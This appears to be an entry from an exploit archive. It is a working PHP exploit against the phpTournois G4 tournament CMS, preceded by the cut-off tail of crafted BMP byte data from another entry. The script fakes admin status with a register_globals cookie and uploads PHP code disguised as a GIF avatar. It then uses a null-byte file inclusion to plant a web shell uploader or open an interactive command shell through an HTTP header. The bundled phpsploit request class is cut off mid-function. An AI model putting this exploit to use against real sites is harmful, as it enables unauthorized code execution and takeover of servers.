""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x00\x00\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01"";  char bmp_file_part2[] =  ""\x48\x01\x01\x01\x47\x01\x01\x01"" ""\x46\x01\x01\x01\x45\x01\x01\x01\x44\x01\x01\x01\x43\x01\x01\x01"" ""\x42\x01\x01\x01\x41\x01\x01\x01\x43\x01\x01\x01\x43\x01\x01\x01"" ""\x43\x01\x01\x01\x43\x01\x01\x01\x48\x01\x01\x01\x47\x01\x01\x01"" ""\x46\x01\x01\x01\x45\x01\x01\x01\x44\x01\x01\x01\x43\x01\x01\x01"" ""\x42\x01\x01\x01\x41\x01\x01\x01\x30\x01\x01\x01\x31\x01\x01\x01"" ""\x32\x01\x01\x01\x33\x01\x01\x01\x34\x01\x01\x01\x35\x01\x01\x01"" ""\x36\x01\x01\x01\x37\x01\x01\x01\x38\x01\x01\x01\x39\x01\x01\x01"" ""\x5a\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x00\x00\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x01\x00\x00\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05"" ""\x05\x05\x05\x00\x00\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"" ""\x01\x01\x05\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a"" ""\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a"" ""\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a"" ""\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a"" ""\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a"" ""\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\",,
,,0,
5404,"phpTournois G4 - Arbitrary File Upload / Code Execution <?php /*  * Name: phpTournois <= G4 Remote File Upload/Code Execution Exploit  * Credits: Charles ""real"" F. <charlesfol[at]hotmail.fr>  * Date: 04-06-08  *  * -> Remote Code Execution  * -> Remote File Upload  *  * When testing if we are admin, phpTournois checks if $grade['a']=='a'.  * But when we are not loggued in, this var is not defined.  * So, using register_globals, we can define it and let the CMS think we  * are authentificated.  * Using configuration zone and avatar upload, we can do a LFI, and then  * everything is possible.  *  */  print ""\n""; print ""   phpTournois <= G4 Remote File Upload/Code Execution Exploit\n""; print ""    by Charles \""real\"" F. <charlesfol[at]hotmail.fr>\n\n"";  if($argc<3) { 	print ""usage: php phptn_exploit.php -url <url> [options]\n\n""; 	print "" Options: -mode    0 -> Remote Upload (default)\n""; 	print ""                   1 -> Remote Code Execution\n""; 	print ""          -proxy   If you want to use a proxy.\n""; 	exit(); }  $url  = getparam(""url"",1); $mode = getparam(""mode"") ? getparam(""mode""): 0; $prx  = getparam(""proxy"");  $xpl = new phpsploit(); if($prx) $xpl->proxy($prx); $xpl->addcookie(""grade[a]"",""a"");  /* Code in the fake avatar */ if($mode==0)	/* upload code */ { 	$file_upload_code = '<?php if(isset($_POST[\'d\'])) unlink(__FILE__); ?><?php if(isset($_POST[\'upload\'])) { if( !move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], ""./"".$_FILES[\'file\'][\'name\'])) echo(""<center>Error "".$_FILES[\'file\'][\'error\'].""</center>"");else echo ""<center>File uploaded</center>""; } ?><form method=""post"" enctype=""multipart/form-data""><center><input type=""file"" name=""file""><input type=""submit"" name=""upload"" value=""Upload""><input type=""submit"" name=""d"" value=""x""></center></form><br><form method=""get""></form>'; 	$c0de =	 '<?php'.""\n"" 			.'error_reporting(0);' 			.""if(isset(\$_SERVER['HTTP_UPLOAD'])) { \$f=fopen('w00t.php','w');fputs(\$f,'"".preg_replace(""#'#i"",""\\'"",$file_upload_code).""');print 'upfiledone'; }\n"" 			.'include(""include/files/accueil.php""); ?>'; } else		/* shell code */ { 	$c0de =	 '<?php'.""\n"" 			.'error_reporting(0);' 			.'if(isset($_SERVER[HTTP_SHELL]))' 			.'{print 123456789;eval($_SERVER[HTTP_SHELL]);exit(123456789);}' 			.'include(""include/files/accueil.php""); ?>'; }  /* Upload avatar with PHP c0de */ print "" * uploading avatar\t"";  $avatar = array(frmdt_url		=> $url.'?page=avatars&op=modify', 		'avatar'		=> array(frmdt_filename => '1.gif',frmdt_type => 'image/gif',frmdt_content => $c0de), 		'id'			=> 1, 		'mode'			=> 'J', 		'avatarurl'		=> '', 		'avatarremoteurl'	=> '', 		'MAX_FILE_SIZE'		=> 999999, 		);  if(preg_match(""#location.href='\?page=avatars&id=\d+&mode=J'#i"",$xpl->formdata($avatar))) print ""done\n""; else die(""error\n"");  if(preg_match('#<span style=""float: right;"" ><img src=""([^""]+)#i',$xpl->get($url.'?page=joueurs&id=1'),$match)) $img = $match[1]; else die("" * can't find image name\n"");  /* Change homepage to our avatar, with a null byte, after saving website name. */ print "" * changing homepage\t""; preg_match('#name=nomsite value=""([^ ]+)""#i',$xpl->get($url.'?page=configuration&op=admin'),$all); $postdata = ""nomsite=$all[1]&urlsite=$url&logo=logo.gif&pagestart=../.$img%00&inscription_joueur=1&inscription_equipe=1&places=200&emailcontact=&emailinscription=&langue=english&theme=phptournois&gzip=1&poulewin=3&poulenull=2&pouleloose=1&poulefor=0&information=&reglement=&decharge=&shoutbox=1&shoutlimit=20&shoutboxc=255&news=1&ladder=1&messagerie=1&support=0&faq=1&serveur=1&download=1&liens=1&galerie=1&livredor=1&sponsors=0&partenaires=1&forum=1&contact=1&horloge=1&commande=1&avatar=A&avatar_upload=1&avatar_remote=1&avatar_gallerie=0&avatar_filesize_max=100000&avatar_x_max=80&avatar_y_max=80&irc=1&ircserver=euroserv.fr.quakenet.org&ircport=6667&ircpassword=&ircchannels=%23phptournois+%23lan+%23lan.cs+%23lan.q3&mail=N&smtpserver=&smtpuser=&smtppassword=""; $xpl->post($url.'?page=configuration&op=modify',$postdata); print ""done\n"";  $success = true;  if($mode==0)	/* upload mode */ { 	print "" * loading uploader\t""; 	$xpl->addheader(""upload"",""1""); 	if(preg_match(""#upfiledone#i"",$xpl->get($url))) print ""done\n""; 	else {$success=false;print ""error\n"";} } else			/* shell mode */ { 	print ""\n\$shell> ""; 	while(!preg_match(""#^(quit|exit)$#"",($cmd = trim(fgets(STDIN))))) 	{ 		$xpl->reset('header'); 		$xpl->addheader('Shell',""system('$cmd');""); 		$xpl->get($url); 		$data = explode('123456789',$xpl->getcontent()); 		print $data[1].""\n\$shell> ""; 	} }  /* Reinitialize website name and homepage and erase user avatar */ print "" * repairing homepage\t""; $xpl->get('http://myannu.fr/?page=avatars&op=delete&id=1&mode=J'); $postdata = ""nomsite=$all[1]&urlsite=$url&logo=logo.gif&pagestart=accueil&inscription_equipe=1&places=200&emailcontact=&emailinscription=&langue=english&theme=phptournois&gzip=1&poulewin=3&poulenull=2&pouleloose=1&poulefor=0&information=&reglement=&decharge=&shoutbox=1&shoutlimit=20&shoutboxc=255&news=1&ladder=1&messagerie=1&support=0&faq=1&serveur=1&download=1&liens=1&galerie=1&livredor=1&sponsors=0&partenaires=1&forum=1&contact=1&horloge=1&commande=1&avatar=A&avatar_upload=1&avatar_remote=1&avatar_gallerie=0&avatar_filesize_max=100000&avatar_x_max=80&avatar_y_max=80&irc=1&ircserver=euroserv.fr.quakenet.org&ircport=6667&ircpassword=&ircchannels=%23phptournois+%23lan+%23lan.cs+%23lan.q3&mail=N&smtpserver=&smtpuser=&smtppassword=""; $xpl->post($url.'?page=configuration&op=modify',$postdata); print ""done\n"";  if($success) print ""\n * uploader: "".$url.""w00t.php\n"";  function getparam($param,$opt='') { 	global $argv; 	foreach($argv as $value => $key) 	{ 		if($key == '-'.$param) return $argv[$value+1]; 	} 	if($opt) exit(""\n-$param parameter required""); 	else return; }  /*  *   * Copyright (C) darkfig  *   * This program is free software; you can redistribute it and/or   * modify it under the terms of the GNU General Public License   * as published by the Free Software Foundation; either version 2   * of the License, or (at your option) any later version.   *   * This program is distributed in the hope that it will be useful,   * but WITHOUT ANY WARRANTY; without even the implied warranty of   * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the   * GNU General Public License for more details.   *   * You should have received a copy of the GNU General Public License   * along with this program; if not, write to the Free Software   * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.  *   * TITLE:          PhpSploit Class  * REQUIREMENTS:   PHP 5 (remove ""private"", ""public"" if you have PHP 4)  * VERSION:        1.2  * LICENSE:        GNU General Public License  * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt  * FILENAME:       phpsploitclass.php  *  * CONTACT:        gmdarkfig@gmail.com (french / english)  * GREETZ:         Sparah, Ddx39  *  * DESCRIPTION:  * The phpsploit is a class implementing a web user agent.  * You can add cookies, headers, use a proxy server with (or without) a  * basic authentification. It supports the GET and the POST method. It can  * also be used like a browser with the cookiejar() function (which allow  * a server to add several cookies for the next requests) and the  * allowredirection() function (which allow the script to follow all  * redirections sent by the server). It can return the content (or the  * headers) of the request. Others useful functions can be used for debugging.  * A manual is actually in development but to know how to use it, you can  * read the comments.  *  * CHANGELOG:  * [2007-01-24] (1.2)  *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))  *  * New: multipart/form-data enctype is now supported   *  * [2006-12-31] (1.1)  *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)  *  * New: You can now call the getheader() / getcontent() function without parameters  *  * [2006-12-30] (1.0)  *  * First version  *   */  class phpsploit {  	/** 	 * This function is called by the get()/post() functions. 	 * You don't have to call it, this is the main function. 	 * 	 * @return $server_response 	 */ 	private function sock() 	{ 		if(!empty($this->proxyhost) && !empty($this->proxyport)) $socket = fsockopen($this->proxyhost,$this->proxyport); 		else $socket = fsockopen($this->host,$this->port); 		 		if(!$socket) die(""Error: The host doesn't exist""); 		 		if($this->method===""get"") $this->packet = ""GET "".$this->url."" HTTP/1.1\r\n""; 		elseif($this->method===""post"" or $this->method===""formdata"") $this->packet = ""POST "".$this->url. "" HTTP/1.1\r\n""; 		else die(""Error: Invalid method""); 		 		if(!empty($this->proxyuser)) $this->packet .= ""Proxy-Authorization: Basic "".base64_encode($this->proxyuser."":"".$this->proxypass).""\r\n""; 		$this->packet .= ""Host: "".$this->host.""\r\n""; 		 		if(!empty($this->agent))  $this->packet .= ""User-Agent: "".$this->agent.""\r\n""; 		if(!empty($this->header)) $this->packet .= $this->header.""\r\n""; 		if(!empty($this->cookie)) $this->packet .= ""Cookie: "".$this->cookie.""\r\n""; 		 		$this->packet .= ""Connection: Close\r\n""; 		if($this->method===""post"") 		{ 			$this->packet .= ""Content-Type: application/x-www-form-urlencoded\r\n""; 			$this->packet .= ""Content-Length: "".strlen($this->data).""\r\n\r\n""; 			$this->packet .= $this->data.""\r\n""; 		} 		elseif($this->method===""formdata"") 		{ 			$this->packet .= ""Content-Type: multipart/form-data; boundary=---------------------------"".$this->boundary.""\r\n""; 			$this->packet .= ""Content-Length: "".strlen($this->data).""\r\n\r\n""; 			$this->packet .= $this->data; 		} 		$this->packet .= ""\r\n""; 		$this->recv = ''; 		 		fputs($socket,$this->packet); 		while(!feof($socket)) $this->recv .= fgets($socket); 		fclose($socket); 		 		if($this->cookiejar) $this->cookiejar($this->getheader($this->recv)); 		if($this->allowredirection) return $this->allowredirection($this->recv); 		else return $this->recv; 	} 	  	/** 	 * This function allows you to add several cookie in the 	 * request. Several methods are supported: 	 *  	 * $this->addcookie(""name"",""value""); 	 * or 	 * $this->addcookie(""name=newvalue""); 	 * or 	 * $this->addcookie(""othername=overvalue; xx=zz; y=u""); 	 *  	 * @param string $cookiename 	 * @param string $cookievalue 	 *  	 */ 	public function addcookie($cookn,$cookv='') 	{ 		// $this->addcookie(""name"",""value""); work avec replace 		if(!empty($cookv)) 		{ 			if($cookv === ""deleted"") $cookv=''; // cookiejar(1) && Set-Cookie: name=delete 			if(!empty($this->cookie)) 			{ 			    if(preg_match(""/$cookn=/"",$this->cookie)) 			    { 			    	$this->cookie = preg_replace(""/$cookn=(\S*);/"",""$cookn=$cookv;"",$this->cookie); 			    } 			    else 			    { 			    	$this->cookie .= "" "".$cookn.""="".$cookv."";""; // "" "". 			    } 			} 			else 			{ 				$this->cookie = $cookn.""="".$cookv."";""; 			} 		} 		// $this->addcookie(""name=value; othername=othervalue""); 		else 		{ 	    	 if(!empty($this->cookie)) 	    	 { 	    	 	$cookn = preg_replace(""/(.*);$/"",""$1"",$cookn); 	    	 	$cookarr = explode("";"",str_replace("" "", """",$cookn)); 	    	 	for($i=0;$i<count($cookarr);$i++) 	    	 	{ 	    	 		preg_match(""/(\S*)=(\S*)/"",$cookarr[$i],$matches); 	    	 		$cookn = $matches[1]; 	    	 		$cookv = $matches[2]; 	    	 		$this->addcookie($cookn,$cookv); 	    	 	} 	    	 } 			 else 			 { 			 	$cookn = ((substr($cookn,(strlen($cookn)-1),1))==="";"") ? $cookn : $cookn."";""; 			 	$this->cookie = $cookn;			 			 } 		} 	} 	 	 	/** 	 * This function allows you to add several headers in the 	 * request. Several methods are supported: 	 * 	 * $this->addheader(""headername"",""headervalue""); 	 * or 	 * $this->addheader(""headername: headervalue""); 	 * 	 * @param string $headername 	 * @param string $headervalue 	 */ 	public function addheader($headern,$headervalue='') 	{ 		// $this->addheader(""name"",""value""); 		if(!empty($headervalue)) 		{ 			if(!empty($this->header)) 			{ 				if(preg_match(""/$headern:/"",$this->header)) 				{ 					$this->header = preg_replace(""/$headern: (\S*)/"",""$headern: $headervalue"",$this->header); 				} 				else 				{ 					$this->header .= ""\r\n"".$headern."": "".$headervalue; 				} 			} 			else 			{ 				$this->header=$headern."": "".$headervalue; 			} 		} 		// $this->addheader(""name: value""); 		else  		{ 			if(!empty($this->header)) 			{ 				$headarr = explode("": "",$headern); 				$headern = $headarr[0]; 				$headerv = $headarr[1]; 				$this->addheader($headern,$headerv); 			} 			else 			{ 				$this->header=$headern; 			} 		} 	} 	  	/** 	 * This function allows you to use an http proxy server. 	 * Several methods are supported: 	 *  	 * $this->proxy(""proxyip"",""8118""); 	 * or 	 * $this->proxy(""proxyip:8118"") 	 * 	 * @param string $proxyhost 	 * @param integer $proxyport 	 */ 	public function proxy($proxy,$proxyp='') 	{ 		// $this->proxy(""localhost:8118""); 		if(empty($proxyp)) 		{ 			preg_match(""/^(\S*):(\d+)$/"",$proxy,$proxarr); 			$proxh = $proxarr[1]; 			$proxp = $proxarr[2]; 			$this->proxyhost=$proxh; 			$this->proxyport=$proxp; 		} 		// $this->proxy(""localhost"",8118); 		else  		{ 			$this->proxyhost=$proxy; 			$this->proxyport=intval($proxyp); 		} 		if($this->proxyport > 65535) die(""Error: Invalid port number""); 	} 	  	/** 	 * This function allows you to use an http proxy server 	 * which requires a basic authentification. Several 	 * methods are supported: 	 *  	 * $this->proxyauth(""darkfig"",""dapasswd""); 	 * or 	 * $this->proxyauth(""darkfig:dapasswd""); 	 * 	 * @param string $proxyuser 	 * @param string $proxypass 	 */ 	public function proxyauth($proxyauth,$proxypasse='') 	{ 		// $this->proxyauth(""darkfig:password""); 		if(empty($proxypasse)) 		{ 			preg_match(""/^(.*):(.*)$/"",$proxyauth,$proxautharr); 			$proxu = $proxautharr[1]; 			$proxp = $proxautharr[2]; 			$this->proxyuser=$proxu; 			$this->proxypass=$proxp; 		} 		// $this->proxyauth(""darkfig"",""password""); 		else 		{ 			$this->proxyuser=$proxyauth; 			$this->proxypass=$proxypasse; 		} 	}  	 	/** 	 * This function allows you to set the ""User-Agent"" header. 	 * Several methods are possible to do that: 	 *  	 * $this->agent(""Mozilla Firefox""); 	 * or 	 * $this->addheader(""User-Agent: Mozilla Firefox""); 	 * or 	 * $this->addheader(""User-Agent"",""Mozilla Firefox""); 	 *  	 * @param string $useragent 	 */ 	public function agent($useragent) 	{ 		$this->agent=$useragent; 	}  	 	/** 	 * This function returns the header which will be 	 * in the next request. 	 *  	 * $this->showheader(); 	 * 	 * @return $header 	 */ 	public function showheader() 	{ 		return $this->header; 	}  	 	/** 	 * This function returns the cookie which will be 	 * in the next request. 	 *  	 * $this->showcookie(); 	 * 	 * @return $storedcookies 	 */ 	public function showcookie() 	{ 		return $this->cookie; 	}  	 	/** 	 * This function returns the last formed 	 * http request (the http packet). 	 *  	 * $this->showlastrequest(); 	 *  	 * @return $last_http_request 	 */ 	public function showlastrequest() 	{ 		return $this->packet; 	} 	 	 	/** 	 * This function sends the formed http packet with the 	 * GET method. You can precise the port of the host. 	 *  	 * $this->get(""http://localhost""); 	 * $this->get(""http://localhost:888/xd/tst.php""); 	 *  	 * @param string $urlwithpath 	 * @return $server_response 	 */ 	public function get($url) 	{ 		$this->target($url); 		$this->method=""get""; 		return $this->sock(); 	}  	 	/** 	 * This function sends the formed http packet with the 	 * POST method. You can precise the port of the host. 	 *  	 * $this->post(""http://localhost/index.php"",""admin=1&user=dark""); 	 * 	 * @param string $urlwithpath 	 * @param string $postdata 	 * @return $server_response 	 */	 	public function post($url,$data) 	{ 		$this->target($url); 		$this->method=""post""; 		$this->data=$data; 		return $this->sock(); 	} 	  	/** 	 * This function sends the formed http packet with the 	 * POST method using the multipart/form-data enctype.  	 *  	 * $array = array( 	 *          frmdt_url      => ""http://localhost/upload.php"", 	 *          frmdt_boundary => ""123456"",                    # Optional 	 *                 ""email"" => ""me@u.com"", 	 *               ""varname"" => array( 	 *                            frmdt_type => ""image/gif"",   # Optional 	 *                       frmdt_transfert => ""binary"",      # Optional 	 *                        frmdt_filename => ""hello.php"", 	 *                         frmdt_content => ""<?php echo ':)'; ?>"")); 	 * $this->formdata($array); 	 * 	 * @param array $array 	 * @return $server_response 	 */ 	public function formdata($array) 	{ 		$this->target($array[frmdt_url]); 		$this->method=""formdata""; 		$this->data=''; 		if(!isset($array[frmdt_boundary])) $this->boundary=""phpsploit""; 		else $this->boundary=$array[frmdt_boundary]; 		foreach($array as $key => $value) 		{ 			if(!preg_match(""#^frmdt_(boundary|url)#"",$key)) 			{ 				$this->data .= ""-----------------------------"".$this->boundary.""\r\n""; 				$this->data .= ""Content-Disposition: form-data; name=\"""".$key.""\"";""; 				if(!is_array($value)) 				{ 					$this->data .= ""\r\n\r\n"".$value.""\r\n""; 				} 				else 				{ 					$this->data .= "" filename=\"""".$array[$key][frmdt_filename].""\"";\r\n""; 					if(isset($array[$key][frmdt_type])) $this->data .= ""Content-Type: "".$array[$key][frmdt_type].""\r\n""; 					if(isset($array[$key][frmdt_transfert])) $this->data .= ""Content-Transfer-Encoding: "".$array[$key][frmdt_transfert].""\r\n""; 					$this->data .= ""\r\n"".$array[$key][frmdt_content].""\r\n""; 				} 			} 		} 		$this->data .= 